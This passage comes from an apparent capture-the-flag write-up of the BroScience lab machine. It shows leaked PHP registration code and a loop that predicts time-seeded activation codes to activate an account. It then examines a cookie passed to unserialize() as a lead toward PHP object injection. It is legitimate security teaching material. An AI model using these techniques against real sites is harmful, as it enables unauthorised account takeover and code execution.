</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>Date: Sat, 28 Jan 2023 09:11:43 GMT
</span></span><span class=line><span class=cl>Server: Apache/2.4.54 (Debian)
</span></span><span class=line><span class=cl>Content-Length: 5743
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Type: image/png
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>session_start();
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// Check if user is logged in already
</span></span><span class=line><span class=cl>if (isset($_SESSION[&#39;id&#39;])) {
</span></span><span class=line><span class=cl>    header(&#39;Location: /index.php&#39;);
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// Handle a submitted register form
</span></span><span class=line><span class=cl>if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;email&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;]) &amp;&amp; isset($_POST[&#39;password-confirm&#39;])) {
</span></span><span class=line><span class=cl>    // Check if variables are empty
</span></span><span class=line><span class=cl>    if (!empty($_POST[&#39;username&#39;]) &amp;&amp; !empty($_POST[&#39;email&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;]) &amp;&amp; !empty($_POST[&#39;password-confirm&#39;])) {
</span></span><span class=line><span class=cl>        // Check if passwords match
</span></span><span class=line><span class=cl>        if (strcmp($_POST[&#39;password&#39;], $_POST[&#39;password-confirm&#39;]) == 0) {
</span></span><span class=line><span class=cl>            // Check if email is too long
</span></span><span class=line><span class=cl>            if (strlen($_POST[&#39;email&#39;]) &lt;= 100) {
</span></span><span class=line><span class=cl>                // Check if email is valid
</span></span><span class=line><span class=cl>                if (filter_var($_POST[&#39;email&#39;], FILTER_VALIDATE_EMAIL)) {
</span></span><span class=line><span class=cl>                    // Check if username is valid
</span></span><span class=line><span class=cl>                    if (strlen($_POST[&#39;username&#39;]) &lt;= 100) {
</span></span><span class=line><span class=cl>                        // Check if user exists already    
</span></span><span class=line><span class=cl>                        include_once &#39;includes/db_connect.php&#39;;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        $res = pg_prepare($db_conn, &#34;check_username_query&#34;, &#39;SELECT id FROM users WHERE username = $1&#39;);
</span></span><span class=line><span class=cl>                        $res = pg_execute($db_conn, &#34;check_username_query&#34;, array($_POST[&#39;username&#39;]));
</span></span><span class=line><span class=cl>                        
</span></span><span class=line><span class=cl>                        if (pg_num_rows($res) == 0) {
</span></span><span class=line><span class=cl>                            // Check if email is registered already
</span></span><span class=line><span class=cl>                            $res = pg_prepare($db_conn, &#34;check_email_query&#34;, &#39;SELECT id FROM users WHERE email = $1&#39;);
</span></span><span class=line><span class=cl>                            $res = pg_execute($db_conn, &#34;check_email_query&#34;, array($_POST[&#39;email&#39;]));
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                            if (pg_num_rows($res) == 0) {
</span></span><span class=line><span class=cl>                                // Create the account
</span></span><span class=line><span class=cl>                                include_once &#39;includes/utils.php&#39;;
</span></span><span class=line><span class=cl>                                $activation_code = generate_activation_code();
</span></span><span class=line><span class=cl>                                $res = pg_prepare($db_conn, &#34;check_code_unique_query&#34;, &#39;SELECT id FROM users WHERE activation_code = $1&#39;);
</span></span><span class=line><span class=cl>                                $res = pg_execute($db_conn, &#34;check_code_unique_query&#34;, array($activation_code));
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                                if (pg_num_rows($res) == 0) {
</span></span><span class=line><span class=cl>                                    $res = pg_prepare($db_conn, &#34;create_user_query&#34;, &#39;INSERT INTO users (username, password, email, activation_code) VALUES ($1, $2, $3, $4)&#39;);
</span></span><span class=line><span class=cl>                                    $res = pg_execute($db_conn, &#34;create_user_query&#34;, array($_POST[&#39;username&#39;], md5($db_salt . $_POST[&#39;password&#39;]), $_POST[&#39;email&#39;], $activation_code));
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                                    // TODO: Send the activation link to email
</span></span><span class=line><span class=cl>                                    $activation_link = &#34;https://broscience.htb/activate.php?code={$activation_code}&#34;;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                                    $alert = &#34;Account created. Please check your email for the activation link.&#34;;
</span></span><span class=line><span class=cl>                                    $alert_type = &#34;success&#34;;
</span></span><span class=line><span class=cl>                                } else {
</span></span><span class=line><span class=cl>                                    $alert = &#34;Failed to generate a valid activation code, please try again.&#34;;
</span></span><span class=line><span class=cl>                                }
</span></span><span class=line><span class=cl>                            } else {
</span></span><span class=line><span class=cl>                                $alert = &#34;An account with this email already exists.&#34;;
</span></span><span class=line><span class=cl>                            }
</span></span><span class=line><span class=cl>                        }
</span></span><span class=line><span class=cl>                        else {
</span></span><span class=line><span class=cl>                            $alert = &#34;Username is already taken.&#34;;
</span></span><span class=line><span class=cl>                        }
</span></span><span class=line><span class=cl>                    } else {
</span></span><span class=line><span class=cl>                        $alert = &#34;Maximum username length is 100 characters.&#34;;
</span></span><span class=line><span class=cl>                    }
</span></span><span class=line><span class=cl>                } else {
</span></span><span class=line><span class=cl>                    $alert = &#34;Please enter a valid email address.&#34;;
</span></span><span class=line><span class=cl>                }
</span></span><span class=line><span class=cl>            } else {
</span></span><span class=line><span class=cl>                $alert = &#34;Maximum email length is 100 characters.&#34;;
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>        } else {
</span></span><span class=line><span class=cl>            $alert = &#34;Passwords do not match.&#34;;
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    } else {
</span></span><span class=line><span class=cl>        $alert = &#34;Please fill all fields in.&#34;;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>?&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;html&gt;
</span></span><span class=line><span class=cl>    &lt;head&gt;
</span></span><span class=line><span class=cl>        &lt;title&gt;BroScience : Register&lt;/title&gt;
</span></span><span class=line><span class=cl>        &lt;?php include_once &#39;includes/header.php&#39;; ?&gt;
</span></span><span class=line><span class=cl>    &lt;/head&gt;
</span></span><span class=line><span class=cl>    &lt;body&gt;
</span></span><span class=line><span class=cl>        &lt;?php include_once &#39;includes/navbar.php&#39;; ?&gt;
</span></span><span class=line><span class=cl>        &lt;div class=&#34;uk-container uk-container-xsmall&#34;&gt;
</span></span><span class=line><span class=cl>            &lt;form class=&#34;uk-form-stacked&#34; method=&#34;POST&#34; action=&#34;register.php&#34;&gt;
</span></span><span class=line><span class=cl>                &lt;fieldset class=&#34;uk-fieldset&#34;&gt;
</span></span><span class=line><span class=cl>                    &lt;legend class=&#34;uk-legend&#34;&gt;Register&lt;/legend&gt;
</span></span><span class=line><span class=cl>                    &lt;?php
</span></span><span class=line><span class=cl>                    // Display any alerts
</span></span><span class=line><span class=cl>                    if (isset($alert)) {
</span></span><span class=line><span class=cl>                    ?&gt;
</span></span><span class=line><span class=cl>                    &lt;div uk-alert class=&#34;uk-alert-&lt;?php if(isset($alert_type)){echo $alert_type;}else{echo &#39;danger&#39;;} ?&gt;&#34;&gt;
</span></span><span class=line><span class=cl>                            &lt;a class=&#34;uk-alert-close&#34; uk-close&gt;&lt;/a&gt;
</span></span><span class=line><span class=cl>                            &lt;?=$alert?&gt;
</span></span><span class=line><span class=cl>                        &lt;/div&gt;
</span></span><span class=line><span class=cl>                    &lt;?php
</span></span><span class=line><span class=cl>                    }
</span></span><span class=line><span class=cl>                    ?&gt;
</span></span><span class=line><span class=cl>                    &lt;div class=&#34;uk-margin&#34;&gt;
</span></span><span class=line><span class=cl>                        &lt;input name=&#34;username&#34; class=&#34;uk-input&#34; placeholder=&#34;Username&#34;&gt;
</span></span><span class=line><span class=cl>                    &lt;/div&gt;
</span></span><span class=line><span class=cl>                    &lt;div class=&#34;uk-margin&#34;&gt;
</span></span><span class=line><span class=cl>                        &lt;input name=&#34;email&#34; class=&#34;uk-input&#34; type=&#34;email&#34; placeholder=&#34;Email&#34;&gt;
</span></span><span class=line><span class=cl>                    &lt;/div&gt;
</span></span><span class=line><span class=cl>                    &lt;div class=&#34;uk-margin&#34;&gt;
</span></span><span class=line><span class=cl>                        &lt;input name=&#34;password&#34; class=&#34;uk-input&#34; type=&#34;password&#34; placeholder=&#34;Password&#34;&gt;
</span></span><span class=line><span class=cl>                    &lt;/div&gt;
</span></span><span class=line><span class=cl>                    &lt;div class=&#34;uk-margin&#34;&gt;
</span></span><span class=line><span class=cl>                        &lt;input name=&#34;password-confirm&#34; class=&#34;uk-input&#34; type=&#34;password&#34; placeholder=&#34;Repeat password&#34;&gt;
</span></span><span class=line><span class=cl>                    &lt;/div&gt;
</span></span><span class=line><span class=cl>                    &lt;div class=&#34;uk-margin&#34;&gt;
</span></span><span class=line><span class=cl>                        &lt;button class=&#34;uk-button uk-button-default&#34; type=&#34;submit&#34;&gt;Register&lt;/button&gt;
</span></span><span class=line><span class=cl>                    &lt;/div&gt;
</span></span><span class=line><span class=cl>                &lt;/fieldset&gt;
</span></span><span class=line><span class=cl>            &lt;/form&gt;
</span></span><span class=line><span class=cl>        &lt;/div&gt;
</span></span><span class=line><span class=cl>    &lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span></code></pre></td></tr></table></div></div><p>We have database credentials, but unfortunately the database isn&rsquo;t exposed to the outside world. What I&rsquo;m interested in, without trying more login bypass techniques, is &ndash; how can I accept an activation link when I register a new user?</p><p>When registering, we do a few things:</p><ol><li>check password and confirm password match</li><li>check email &lt;= 100 characters</li><li>check email matches <code>FILTER_VALIDATE_EMAIL</code></li><li>check username &lt;= 100 characters</li><li>check username doesn&rsquo;t already exist in database</li><li>check email doesn&rsquo;t already exist in database</li><li>generate the activation code as above</li><li>confirm this activation code isn&rsquo;t already used and stored against an existing user in the database</li><li>insert the user into the database with the following ordinal values:</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$res</span> <span class=o>=</span> <span class=nx>pg_prepare</span><span class=p>(</span><span class=nv>$db_conn</span><span class=p>,</span> <span class=s2>&#34;create_user_query&#34;</span><span class=p>,</span> <span class=s1>&#39;INSERT INTO users (username, password, email, activation_code) VALUES ($1, $2, $3, $4)&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$res</span> <span class=o>=</span> <span class=nx>pg_execute</span><span class=p>(</span><span class=nv>$db_conn</span><span class=p>,</span> <span class=s2>&#34;create_user_query&#34;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>],</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$db_salt</span> <span class=o>.</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]),</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;email&#39;</span><span class=p>],</span> <span class=nv>$activation_code</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>So, we insert username, password as defined by the output from <code>md5</code> function when given the <code>$db_salt</code> value &ldquo;NaCl&rdquo; and entered password, plus the email and random activation_code.</p><p>I realised that the db salt wasn&rsquo;t really useful at this point, because we still don&rsquo;t have access to the md5 hashes in the database.</p><p>I decided to look back over the generate activation code function we extracted through LFI in HTTP requests above:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>generate_activation_code</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$chars</span> <span class=o>=</span> <span class=s2>&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>srand</span><span class=p>(</span><span class=nx>time</span><span class=p>());</span>
</span></span><span class=line><span class=cl>    <span class=nv>$activation_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=mi>32</span><span class=p>;</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$activation_code</span> <span class=o>=</span> <span class=nv>$activation_code</span> <span class=o>.</span> <span class=nv>$chars</span><span class=p>[</span><span class=nx>rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$chars</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$activation_code</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>When skimming previously, I missed the <code>srand(time())</code> call. The <code>time()</code> function returns number of seconds since the Unix epoch &ndash; and this is used to seed the <code>rand()</code> function for selecting 32 characters when generating our activation code.</p><p>The predictability/determinism/poor entropy of the above function was obvious when running a PHP repl with <code>php -a</code>, defining the above function and executing it quickly:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php &gt; print generate_activation_code();
</span></span><span class=line><span class=cl>epyPkI0Ey1Bgzw6DsRE21Hmqvk9RYYUX
</span></span><span class=line><span class=cl>php &gt; print generate_activation_code();
</span></span><span class=line><span class=cl>epyPkI0Ey1Bgzw6DsRE21Hmqvk9RYYUX
</span></span></code></pre></td></tr></table></div></div><p>So when executing at the same second as above, we get the same activation code. Maybe we can generate a bunch of activation codes for a future epoch, register a new account, then we can predict the activation code?</p><p>The easiest and hackiest option was to basically call the function in an infinite loop, and when registering, keep track of the activation code we generated:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>while</span><span class=p>(</span><span class=k>true</span><span class=p>)</span> <span class=p>{</span> <span class=k>echo</span> <span class=nx>generate_activation_code</span><span class=p>()</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span> <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Another option is to specify <code>srand(time()+x)</code> to get <em>future</em> activation codes</p><p>So, I registered an account with the above loop running:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-28-21-30-29-image.png data-srcset="./assets/2023-01-28-21-30-29-image.png, ./assets/2023-01-28-21-30-29-image.png 1.5x, ./assets/2023-01-28-21-30-29-image.png 2x" data-sizes=auto alt=./assets/2023-01-28-21-30-29-image.png title=./assets/2023-01-28-21-30-29-image.png></p><p>After trying a couple, <a href="https://broscience.htb/activate.php?code=ErJK1irIPK89FtlZmBRPhbLg5rhTSoJJ" target=_blank rel="noopener noreffer">https://broscience.htb/activate.php?code=ErJK1irIPK89FtlZmBRPhbLg5rhTSoJJ</a> worked!:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-28-21-32-31-image.png data-srcset="./assets/2023-01-28-21-32-31-image.png, ./assets/2023-01-28-21-32-31-image.png 1.5x, ./assets/2023-01-28-21-32-31-image.png 2x" data-sizes=auto alt=./assets/2023-01-28-21-32-31-image.png title=./assets/2023-01-28-21-32-31-image.png></p><p>Finally, I was able to log in with my new account credentials - mycooluser / foobar:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-28-21-33-06-image.png data-srcset="./assets/2023-01-28-21-33-06-image.png, ./assets/2023-01-28-21-33-06-image.png 1.5x, ./assets/2023-01-28-21-33-06-image.png 2x" data-sizes=auto alt=./assets/2023-01-28-21-33-06-image.png title=./assets/2023-01-28-21-33-06-image.png></p><p>The new thing we can see is the paint icon to change theme, which is a link to <code>/swap_theme.php</code>. Using our path traversal vuln before to do local file inclusion, we can see that <code>swap_theme.php</code> contains the following:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Check if user is logged in already
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Location: /index.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Swap the theme
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>include_once</span> <span class=s2>&#34;includes/utils.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>strcmp</span><span class=p>(</span><span class=nx>get_theme</span><span class=p>(),</span> <span class=s2>&#34;light&#34;</span><span class=p>)</span> <span class=o>===</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>set_theme</span><span class=p>(</span><span class=s2>&#34;dark&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>set_theme</span><span class=p>(</span><span class=s2>&#34;light&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Redirect
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_REFERER&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: </span><span class=si>{</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_REFERER&#39;</span><span class=p>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: /index.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Back in <code>includes/utils.php</code>, the <code>get_theme()</code> function does the following:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>get_theme</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;user-prefs&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$up_cookie</span> <span class=o>=</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>UserPrefs</span><span class=p>()));</span>
</span></span><span class=line><span class=cl>            <span class=nx>setcookie</span><span class=p>(</span><span class=s1>&#39;user-prefs&#39;</span><span class=p>,</span> <span class=nv>$up_cookie</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$up_cookie</span> <span class=o>=</span> <span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;user-prefs&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nv>$up</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$up_cookie</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$up</span><span class=o>-&gt;</span><span class=na>theme</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;light&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>What is this doing?:</p><ol><li>get the user-prefs value from the browser cookie if it exists</li><li>calls <code>unserialize(base64_decode($up_cookie))</code> on the value</li><li>returns the theme from this deserialised object</li></ol><p>Searching for unserialize exploitation, I came across PHP object injection in these three articles:</p><ul><li><a href=https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a target=_blank rel="noopener noreffer">Exploiting PHP Deserialization</a></li><li><a href=https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection target=_blank rel="noopener noreffer">PHP Object Injection | OWASP Foundation</a></li><li><a href=https://snoopysecurity.github.io/web-application-security/2021/01/08/02_php_object_injection_exploitation-notes.html target=_blank rel="noopener noreffer">PHP Object Injection Exploitation Notes</a></li></ul><p>The TL;DR is that <code>serialize()</code> and <code>unserialize()</code> allow us to take a PHP object and serialise it into a string representation, or conversely, take a string representation of an object and deserialise it back into an object.</p><p>Interestingly the <code>unserialize()</code> function will look for PHP &ldquo;magic methods&rdquo; such as <code>__wakeup()</code> and <code>__destruct()</code> and execute these if they exist. Hence, if we create our own serialized string with a magic method executing arbitrary code, when <code>unserialize</code> takes our string and deserializes is, <em>potentially</em> the PHP server will execute the code in our magic method, hence achieving RCE on the target.</p><p>Looking at my own cookie now I&rsquo;m logged into the web application, I see the following for <code>user-prefs</code>, which I can base64 decode as per the <code>get_theme()</code> method above, and deserialise back into a <code>UserPrefs</code> object (after I&rsquo;ve defined <code>UserPrefs</code> in my local PHP interpreter):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>UserPrefs</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$theme</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=k>function</span> <span class=nf>construct</span><span class=p>(</span><span class=nv>$theme</span> <span class=o>=</span> <span class=s2>&#34;light&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>theme</span> <span class=o>=</span> <span class=nv>$theme</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$user_prefs_str</span> <span class=o>=</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=s2>&#34;Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30=&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>print</span> <span class=s2>&#34;Serialized UserPrefs object: &#34;</span> <span class=o>.</span> <span class=nv>$user_prefs_str</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$user_prefs_obj</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$user_prefs_str</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>print</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>existing theme from deserialized object: &#34;</span> <span class=o>.</span> <span class=nv>$user_prefs_obj</span><span class=o>-&gt;</span><span class=na>theme</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$php</span> test.php 
</span></span><span class=line><span class=cl>Serialized UserPrefs object: O:9:<span class=s2>&#34;UserPrefs&#34;</span>:1:<span class=o>{</span>s:5:<span class=s2>&#34;theme&#34;</span><span class=p>;</span>s:5:<span class=s2>&#34;light&#34;</span><span class=p>;</span><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>existing theme from deserialized object: light
